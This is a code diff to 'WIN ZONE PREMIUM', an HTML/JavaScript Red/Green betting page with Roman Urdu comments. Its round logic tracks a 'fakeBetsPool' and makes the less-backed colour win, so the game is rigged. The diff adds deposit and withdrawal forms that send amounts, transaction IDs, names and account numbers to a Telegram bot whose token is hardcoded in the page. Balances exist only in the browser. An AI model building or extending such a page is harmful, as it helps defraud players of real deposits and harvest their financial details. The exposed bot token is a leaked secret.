@@ -163,7 +163,8 @@
 <body>
 
     <div class="header">
-        <img id="logoImg" class="app-logo" src="logo.png" alt="Logo" onerror="this.style.display='none';">
+        <!-- AGAR LOGO LAGANA HO TO APNA LOGO LINK SRC MEIN DIEN -->
+        <img id="logoImg" class="app-logo" src="logo.png" alt="Logo" onload="this.style.display='block';" onerror="this.style.display='none';">
         <span id="headerText">WIN ZONE PREMIUM</span>
     </div>
 
@@ -196,6 +197,7 @@
         <div>System initialized. Waiting for bets...</div>
     </div>
 
+    <!-- DEPOSIT MODAL -->
     <div id="depositModal" class="modal">
         <div class="modal-content">
             <h3>Deposit Funds</h3>
@@ -219,6 +221,7 @@
         </div>
     </div>
 
+    <!-- WITHDRAW MODAL -->
     <div id="withdrawModal" class="modal">
         <div class="modal-content">
             <h3>Withdraw Funds</h3>
@@ -238,13 +241,13 @@
     </div>
 
     <script>
+        // TELEGRAM GLOBAL CONFIGURATION
+        const telegramToken = "8854952702:AAFEJrRKpYI8up9CdtGeA5LSKMzeHKNq2Zg";
+        const telegramChatId = "8608893352";
+
         let currentBalance = 1000;
         let timeLeft = 30;
         let fakeBetsPool = { Red: 0, Green: 0 };
-
-        // Real-time Telegram Verification Check
-        const token = "8854952702:AAFEJrRKpYI8up9CdtGeA5LSKMzeHKNq2Zg";
-        const chatId = "8608893352";
 
         // Countdown Timer Logic
         const timerInterval = setInterval(() => {
@@ -282,4 +285,92 @@
             } else if (fakeBetsPool.Green < fakeBetsPool.Red) {
                 winner = "Green";
             } else {
-                winner =
+                winner = Math.random() > 0.5 ? "Red" : "Green";
+            }
+            addLog(`🏆 Round Finished! Winner is [${winner}]`);
+            fakeBetsPool = { Red: 0, Green: 0 };
+        }
+
+        function addLog(text) {
+            let logSection = document.getElementById('logSection');
+            let newLog = document.createElement('div');
+            newLog.innerText = text;
+            logSection.appendChild(newLog);
+            logSection.scrollTop = logSection.scrollHeight;
+        }
+
+        function openModal(id) { 
+            document.getElementById(id).style.display = "flex"; 
+        }
+        
+        function closeModal(id) { 
+            document.getElementById(id).style.display = "none"; 
+        }
+
+        // Perfected Deposit Function
+        function submitDeposit() {
+            let amount = document.getElementById('depAmount').value;
+            let trx = document.getElementById('depTrx').value;
+            let method = document.getElementById('depMethod').value;
+
+            if(!amount || !trx) {
+                alert("Meherbani karke Amount aur TRX ID dono enter karein!");
+                return;
+            }
+
+            let message = `💰 *NEW DEPOSIT REQUEST* 💰\n\n🔹 *Method:* ${method}\n🔹 *Amount:* PKR ${amount}\n🔹 *TRX ID:* \`${trx}\``;
+            let url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(url)
+            .then(res => {
+                alert(`Deposit Request Sent!\nMethod: ${method}\nAmount: PKR ${amount}\nTRX ID: ${trx}\n\nAdmin verification ke baad balance add ho jayega.`);
+                addLog(`⏳ Deposit Request submitted: PKR ${amount} via ${method} (Pending)`);
+            })
+            .catch(err => {
+                alert("Network error! Try again.");
+            });
+
+            closeModal('depositModal');
+            document.getElementById('depAmount').value = '';
+            document.getElementById('depTrx').value = '';
+        }
+
+        // Perfected Withdraw Function
+        function submitWithdraw() {
+            let amount = parseInt(document.getElementById('withAmount').value);
+            let account = document.getElementById('withAccount').value;
+            let name = document.getElementById('withName').value;
+            let method = document.getElementById('withMethod').value;
+
+            if(!amount || !account || !name) {
+                alert("Saari fields fill karna lazmi hai!");
+                return;
+            }
+            if(amount > currentBalance) {
+                alert("Aapka balance withdraw amount se kam hai!");
+                return;
+            }
+
+            currentBalance -= amount;
+            document.getElementById('balance').innerText = `PKR ${currentBalance}`;
+
+            let message = `📤 *NEW WITHDRAW REQUEST* 📤\n\n🔹 *Method:* ${method}\n🔹 *Amount:* PKR ${amount}\n🔹 *Account:* \`${account}\`\n🔹 *Name:* ${name}`;
+            let url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(url)
+            .then(res => {
+                alert(`Withdrawal Request Sent!\nAmount: PKR ${amount}\nAccount: ${account}\n\nAdmin 24 ghante ke andar transfer kar dega.`);
+                addLog(`📤 Withdraw Request: PKR ${amount} sent to ${account} (${method})`);
+            })
+            .catch(err => {
+                alert("Network error! Try again.");
+            });
+
+            closeModal('withdrawModal');
+            document.getElementById('withAmount').value = '';
+            document.getElementById('withAccount').value = '';
+            document.getElementById('withName').value = '';
+        }
+    </script>
+</body>
+</html>
